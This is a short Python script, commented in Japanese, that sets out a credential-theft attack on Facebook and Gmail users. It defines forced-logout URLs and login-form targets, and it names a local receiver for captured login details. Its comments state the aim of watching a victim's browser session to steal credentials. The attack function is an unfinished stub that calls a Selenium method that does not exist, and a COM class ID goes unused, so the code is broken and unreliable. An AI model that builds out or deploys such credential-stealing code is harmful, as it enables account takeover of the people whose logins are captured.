# -*- coding: utf-8 -*-
import time
import urllib
from selenium import webdriver
###############################################################################
FACEBOOK_URL      = "www.facebook.com"
GOOGLE_URL        = "accounts.google.com"
TARGET_DOMAIN     = (
    "www.gmail.com",
    "mail.google.com",
    )
###############################################################################


def preparation():
    # 標的サイトの認証情報の送信先
    data_receiver = "http://localhost:8080"
    """
    標的サイトについての情報を辞書型で定義
    login_url         :   強制ログアウトurl
    logout_form       :   強制ログアウトさせるためのDOM要素
    login_form_index  :   標的対象のDOMのindex
    owned             :   認証情報が取得済か否か
    """
    target_site = {}
    target_site[FACEBOOK_URL] = {
        "logout_url"       : None,
        "logout_form"      :"logout_form",
        "login_form_index" :0,
        "owned"            :False,
    }
    target_site[GOOGLE_URL]={
        "logout_url"       :"https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
        "logout_form"      :"logout_form",
        "login_form_index" :0,
        "owned"            :False,
    }

    # 複数のGmailドメイン用に同じ標的ドメインを指定
    for target in TARGET_DOMAIN:
        target_site[target] = target_site[GOOGLE_URL]


    clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

def attack():
    # 標的ブラウザのセッションを監視し、目的のサイトの認証情報を窃取
    firefox = webdriver.Firefox()
    url = firefox.getCurrentUrl()

preparation()
attack()